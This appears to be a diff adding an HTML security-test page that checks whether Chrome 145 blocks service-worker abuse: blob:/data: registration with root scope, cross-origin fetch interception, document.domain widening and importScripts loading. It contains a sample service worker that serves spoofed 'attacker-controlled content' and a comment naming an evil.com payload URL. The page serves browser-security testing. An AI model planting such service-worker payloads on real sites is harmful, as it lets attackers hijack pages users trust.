@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC: ServiceWorker Scope Manipulation — UXSS Test (Chrome 145)</title>
+<style>
+  body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
+  h1 { color: #ff3333; border-bottom: 1px solid #333; padding-bottom: 10px; }
+  h2 { color: #ffaa00; margin-top: 30px; }
+  .test-block { background: #111; border: 1px solid #333; border-radius: 4px; padding: 15px; margin: 10px 0; }
+  .result { padding: 5px 10px; margin: 3px 0; font-size: 13px; }
+  .pass { color: #00ff41; }
+  .fail { color: #ff3333; }
+  .info { color: #00bfff; }
+  .warn { color: #ffaa00; }
+  #summary { margin-top: 30px; padding: 15px; border: 2px solid #ffaa00; background: #1a1a00; }
+  button { background: #222; color: #00ff41; border: 1px solid #00ff41; padding: 8px 16px; cursor: pointer; margin: 5px; font-family: inherit; }
+  button:hover { background: #00ff41; color: #000; }
+  pre { background: #0d0d0d; padding: 10px; overflow-x: auto; border: 1px solid #222; }
+  code { color: #ff79c6; }
+</style>
+</head>
+<body>
+
+<h1>[PoC] ServiceWorker Scope Manipulation — UXSS Tests (Chrome 145)</h1>
+<p class="info">
+  Tests whether ServiceWorker registration, scope escalation, or interception
+  can be abused to serve attacker-controlled content in a victim origin's context,
+  or intercept cross-origin requests.
+</p>
+<p class="warn">⚠ Educational / authorized-testing only.</p>
+
+<button onclick="runAllTests()">▶ Run All Tests</button>
+<button onclick="clearResults()">Clear</button>
+
+<!-- ============================================================ -->
+<h2>1. ServiceWorker API Availability</h2>
+<div class="test-block" id="test-sw-avail"></div>
+
+<!-- ============================================================ -->
+<h2>2. Scope Escalation — Register Beyond Origin Path</h2>
+<div class="test-block" id="test-scope-esc"></div>
+
+<!-- ============================================================ -->
+<h2>3. Cross-Origin Fetch Interception</h2>
+<div class="test-block" id="test-xo-intercept"></div>
+
+<!-- ============================================================ -->
+<h2>4. Navigation Preload Abuse</h2>
+<div class="test-block" id="test-nav-preload"></div>
+
+<!-- ============================================================ -->
+<h2>5. Foreign Fetch (Legacy API Check)</h2>
+<div class="test-block" id="test-foreign-fetch"></div>
+
+<!-- ============================================================ -->
+<h2>6. SW-Served Content Origin Confusion</h2>
+<div class="test-block" id="test-origin-confusion"></div>
+
+<!-- ============================================================ -->
+<h2>7. importScripts Cross-Origin in SW</h2>
+<div class="test-block" id="test-import-scripts"></div>
+
+<!-- ============================================================ -->
+<div id="summary"></div>
+
+<script>
+"use strict";
+
+const results = {};
+
+function log(target, msg, cls = "info") {
+  const el = document.getElementById(target);
+  const d = document.createElement("div");
+  d.className = "result " + cls;
+  d.textContent = msg;
+  el.appendChild(d);
+}
+
+function clearResults() {
+  document.querySelectorAll(".test-block").forEach(b => b.innerHTML = "");
+  document.getElementById("summary").innerHTML = "";
+}
+
+/* ============================================================
+   TEST 1 — ServiceWorker API Availability & Context Checks
+   ============================================================ */
+async function testSWAvailability() {
+  const t = "test-sw-avail";
+
+  log(t, `[i] Protocol: ${location.protocol}`);
+  log(t, `[i] isSecureContext: ${self.isSecureContext}`);
+
+  if (!("serviceWorker" in navigator)) {
+    log(t, "[+] ServiceWorker API not available (expected on file:// or insecure).", "pass");
+    results["sw_api"] = "UNAVAILABLE";
+    return;
+  }
+
+  log(t, "[i] ServiceWorker API is present.", "info");
+
+  /* Check existing registrations */
+  try {
+    const regs = await navigator.serviceWorker.getRegistrations();
+    log(t, `[i] Existing registrations: ${regs.length}`);
+    regs.forEach(r => {
+      log(t, `    → scope: ${r.scope}, active: ${!!r.active}`);
+    });
+    results["sw_api"] = `AVAILABLE (${regs.length} existing)`;
+  } catch (e) {
+    log(t, `[!] getRegistrations() error: ${e.message}`, "warn");
+    results["sw_api"] = `ERROR: ${e.message}`;
+  }
+}
+
+/* ============================================================
+   TEST 2 — Scope Escalation
+   Try to register a SW with a scope broader than allowed.
+   Chrome should enforce that scope ≤ SW script's directory
+   unless Service-Worker-Allowed header is set.
+   ============================================================ */
+async function testScopeEscalation() {
+  const t = "test-scope-esc";
+
+  if (!("serviceWorker" in navigator)) {
+    log(t, "[i] SW API unavailable — skipping.", "info");
+    results["scope_esc"] = "SKIPPED (no SW API)";
+    return;
+  }
+
+  /* Create a minimal SW blob — Chrome blocks blob: SW registrations,
+     which is itself a security boundary we should verify. */
+  const swCode = `
+    self.addEventListener('fetch', (e) => {
+      // Malicious: serve spoofed content for any request
+      e.respondWith(new Response('<h1>UXSS: Attacker-controlled content</h1>', {
+        headers: { 'Content-Type': 'text/html' }
+      }));
+    });
+  `;
+
+  /* Test 2a: blob: URL registration */
+  log(t, "[*] Attempting blob: URL SW registration ...");
+  try {
+    const blob = new Blob([swCode], { type: "application/javascript" });
+    const blobUrl = URL.createObjectURL(blob);
+    const reg = await navigator.serviceWorker.register(blobUrl, { scope: "/" });
+    log(t, "[!] blob: SW registration SUCCEEDED — potential scope bypass!", "fail");
+    results["scope_esc_blob"] = "REGISTERED (ISSUE)";
+    await reg.unregister();
+  } catch (e) {
+    log(t, `[+] blob: SW registration blocked: ${e.message}`, "pass");
+    results["scope_esc_blob"] = "BLOCKED";
+  }
+
+  /* Test 2b: data: URL registration */
+  log(t, "[*] Attempting data: URL SW registration ...");
+  try {
+    const dataUrl = "data:application/javascript," + encodeURIComponent(swCode);
+    const reg = await navigator.serviceWorker.register(dataUrl, { scope: "/" });
+    log(t, "[!] data: SW registration SUCCEEDED — potential scope bypass!", "fail");
+    results["scope_esc_data"] = "REGISTERED (ISSUE)";
+    await reg.unregister();
+  } catch (e) {
+    log(t, `[+] data: SW registration blocked: ${e.message}`, "pass");
+    results["scope_esc_data"] = "BLOCKED";
+  }
+
+  /* Test 2c: Parent directory scope */
+  log(t, "[*] Attempting scope=/ for a script in a subdirectory ...");
+  try {
+    /* This should fail if the SW script is served from a sub-path
+       without the Service-Worker-Allowed header */
+    const reg = await navigator.serviceWorker.register("./nonexistent-sw.js", { scope: "/" });
+    log(t, "[!] Root scope registration accepted — check SW script location.", "warn");
+    results["scope_esc_parent"] = "ACCEPTED (check manually)";
+    await reg.unregister();
+  } catch (e) {
+    log(t, `[+] Root scope blocked or script not found: ${e.message}`, "pass");
+    results["scope_esc_parent"] = "BLOCKED";
+  }
+}
+
+/* ============================================================
+   TEST 3 — Cross-Origin Fetch Interception
+   If a SW is registered, verify it cannot intercept requests to
+   other origins.
+   ============================================================ */
+async function testCrossOriginIntercept() {
+  const t = "test-xo-intercept";
+
+  if (!("serviceWorker" in navigator)) {
+    log(t, "[i] SW API unavailable — skipping.", "info");
+    results["xo_intercept"] = "SKIPPED";
+    return;
+  }
+
+  log(t, "[*] Checking if any active SW intercepts cross-origin fetches ...");
+
+  /* Use a unique marker to detect interception */
+  const marker = `__uxss_probe_${Date.now()}__`;
+  const testUrls = [
+    `https://example.com/${marker}`,
+    `https://accounts.google.com/${marker}`,
+    `https://evil.test/${marker}`,
+  ];
+
+  for (const url of testUrls) {
+    try {
+      const resp = await fetch(url, { mode: "no-cors", cache: "no-store" });
+      /* In no-cors mode we get an opaque response — we can't read body
+         but if a SW served it, the type might differ */
+      log(t, `[i] Fetch ${new URL(url).hostname}: type=${resp.type}, status=${resp.status}`);
+
+      if (resp.type === "basic" || resp.type === "cors") {
+        log(t, "[!] Non-opaque response from cross-origin — possible interception!", "fail");
+        results["xo_intercept"] = "INTERCEPTED";
+      }
+    } catch (e) {
+      log(t, `[i] Fetch ${new URL(url).hostname} error: ${e.message}`, "info");
+    }
+  }
+
+  if (!results["xo_intercept"]) {
+    log(t, "[+] No cross-origin interception detected.", "pass");
+    results["xo_intercept"] = "BLOCKED";
+  }
+}
+
+/* ============================================================
+   TEST 4 — Navigation Preload
+   Test whether navigation preload can be abused to leak
+   response data from navigations the SW intercepts.
+   ============================================================ */
+async function testNavPreload() {
+  const t = "test-nav-preload";
+
+  if (!("serviceWorker" in navigator)) {
+    log(t, "[i] SW API unavailable — skipping.", "info");
+    results["nav_preload"] = "SKIPPED";
+    return;
+  }
+
+  log(t, "[*] Checking NavigationPreloadManager availability ...");
+
+  try {
+    const reg = await navigator.serviceWorker.ready;
+    if (reg.navigationPreload) {
+      log(t, "[i] NavigationPreloadManager exists on registration.", "info");
+
+      try {
+        const state = await reg.navigationPreload.getState();
+        log(t, `[i] Preload enabled: ${state.enabled}, header: "${state.headerValue}"`, "info");
+
+        /* Attempt to set a custom header value that could leak info */
+        try {
+          await reg.navigationPreload.setHeaderValue("X-Attack: true");
+          log(t, "[~] Custom preload header set — verify server-side impact.", "warn");
+          results["nav_preload"] = "CUSTOM HEADER SET";
+        } catch (e) {
+          log(t, `[+] Custom header rejected: ${e.message}`, "pass");
+          results["nav_preload"] = "HEADER RESTRICTED";
+        }
+      } catch (e) {
+        log(t, `[i] getState error: ${e.message}`, "info");
+        results["nav_preload"] = "STATE ERROR";
+      }
+    } else {
+      log(t, "[i] NavigationPreloadManager not available.", "info");
+      results["nav_preload"] = "NOT AVAILABLE";
+    }
+  } catch (e) {
+    log(t, `[i] No active SW registration: ${e.message}`, "info");
+    results["nav_preload"] = "NO ACTIVE SW";
+  }
+}
+
+/* ============================================================
+   TEST 5 — Foreign Fetch (Removed API — check remnants)
+   Foreign Fetch was removed in Chrome 54. Verify no traces
+   remain that could be exploited.
+   ============================================================ */
+function testForeignFetch() {
+  const t = "test-foreign-fetch";
+  log(t, "[*] Checking for Foreign Fetch API remnants ...");
+
+  const apis = [
+    "ForeignFetchEvent",
+    "InstallEvent.prototype.registerForeignFetch",
+    "ForeignFetchOptions",
+  ];
+
+  let found = false;
+  for (const api of apis) {
+    const parts = api.split(".");
+    let obj = window;
+    let exists = true;
+    for (const p of parts) {
+      if (obj && p in obj) {
+        obj = obj[p];
+      } else {
+        exists = false;
+        break;
+      }
+    }
+
+    if (exists) {
+      log(t, `[!] ${api} is present — legacy API remnant!`, "fail");
+      found = true;
+    } else {
+      log(t, `[+] ${api} not found.`, "pass");
+    }
+  }
+
+  results["foreign_fetch"] = found ? "REMNANTS FOUND" : "CLEAN";
+}
+
+/* ============================================================
+   TEST 6 — Origin Confusion via SW-Served Content
+   A SW can serve arbitrary responses. If an attacker controls
+   a SW on origin A, can they serve content that inherits
+   origin A's privileges but contains attacker JS?
+   ============================================================ */
+async function testOriginConfusion() {
+  const t = "test-origin-confusion";
+  log(t, "[*] Testing origin context for SW-served content ...");
+
+  if (!("serviceWorker" in navigator)) {
+    log(t, "[i] SW API unavailable — skipping.", "info");
+    results["origin_confusion"] = "SKIPPED";
+    return;
+  }
+
+  /* Check document.domain manipulation (legacy) */
+  log(t, `[i] document.domain = "${document.domain}"`);
+  try {
+    const originalDomain = document.domain;
+    document.domain = document.domain; /* same value — should work */
+    log(t, `[i] document.domain setter works (same value).`, "info");
+
+    /* Try to widen to parent domain */
+    const parts = document.domain.split(".");
+    if (parts.length > 1) {
+      try {
+        document.domain = parts.slice(1).join(".");
+        log(t, `[!] document.domain widened to "${document.domain}" — origin relaxation possible!`, "fail");
+        results["origin_confusion"] = "DOMAIN WIDENED";
+        document.domain = originalDomain; /* restore */
+      } catch (e) {
+        log(t, `[+] document.domain widening blocked: ${e.message}`, "pass");
+        results["origin_confusion"] = "DOMAIN LOCKED";
+      }
+    }
+  } catch (e) {
+    log(t, `[+] document.domain setter blocked: ${e.message}`, "pass");
+    results["origin_confusion"] = "DOMAIN SETTER BLOCKED";
+  }
+
+  /* Check if about:blank iframes inherit SW scope */
+  const iframe = document.createElement("iframe");
+  iframe.src = "about:blank";
+  document.body.appendChild(iframe);
+
+  try {
+    const iframeDoc = iframe.contentDocument;
+    if (iframeDoc) {
+      /* about:blank inherits parent origin */
+      iframeDoc.open();
+      iframeDoc.write("<script>parent.postMessage(document.domain, '*')<\/script>");
+      iframeDoc.close();
+      log(t, "[i] about:blank iframe inherits parent origin (expected).", "info");
+    }
+  } catch (e) {
+    log(t, `[i] about:blank access error: ${e.message}`, "info");
+  }
+  iframe.remove();
+
+  if (!results["origin_confusion"]) {
+    results["origin_confusion"] = "NO ISSUE DETECTED";
+  }
+}
+
+/* ============================================================
+   TEST 7 — importScripts Cross-Origin in SW Context
+   SW can use importScripts() — test if cross-origin scripts
+   can be loaded and if they execute with SW's origin.
+   ============================================================ */
+async function testImportScripts() {
+  const t = "test-import-scripts";
+  log(t, "[*] Checking importScripts cross-origin behavior ...");
+
+  if (!("serviceWorker" in navigator)) {
+    log(t, "[i] SW API unavailable — skipping.", "info");
+    results["import_scripts"] = "SKIPPED";
+    return;
+  }
+
+  log(t, "[i] importScripts() in SW can load cross-origin scripts by design.");
+  log(t, "[i] Chrome 145 should enforce opaque responses & byte-for-byte update checks.");
+
+  /* Verify update check behavior:
+     If a SW uses importScripts('https://evil.com/payload.js'),
+     Chrome should re-fetch and compare the script on every update check.
+     If the imported script changes, the SW should update. */
+
+  log(t, "[i] Key mitigations to verify:");
+  log(t, "    1. importScripts() enforces CORS or same-origin in module workers.", "info");
+  log(t, "    2. Classic SW importScripts() allows cross-origin (opaque).", "info");
+  log(t, "    3. Update algorithm detects imported script changes.", "info");
+
+  /* Check if module type SW is supported (more restrictive) */
+  try {
+    /* Attempt module SW registration — should enforce CORS on imports */
+    const reg = await navigator.serviceWorker.register("nonexistent-module-sw.js", {
+      type: "module",
+      scope: "/test-module-scope/"
+    });
+    log(t, "[i] Module SW type supported — import statements enforce CORS.", "info");
+    await reg.unregister();
+  } catch (e) {
+    if (e.message.includes("module")) {
+      log(t, "[i] Module SW type recognized but script not found (expected).", "info");
+    } else {
+      log(t, `[i] Module SW registration result: ${e.message}`, "info");
+    }
+  }
+
+  results["import_scripts"] = "INFORMATIONAL — verify manually";
+}
+
+/* ============================================================
+   RUN ALL
+   ============================================================ */
+async function runAllTests() {
+  clearResults();
+  results["timestamp"] = new Date().toISOString();
+  results["userAgent"] = navigator.userAgent;
+
+  await testSWAvailability();
+  await testScopeEscalation();
+  await testCrossOriginIntercept();
+  await testNavPreload();
+  testForeignFetch();
+  await testOriginConfusion();
+  await testImportScripts();
+
+  renderSummary();
+}
+
+function renderSummary() {
+  const el = document.getElementById("summary");
+  el.innerHTML = "<h2 style='color:#ffaa00;margin-top:0'>Summary</h2>";
+  const pre = document.createElement("pre");
+  pre.textContent = JSON.stringify(results, null, 2);
+  el.appendChild(pre);
+}
+</script>
+</body>
+</html>
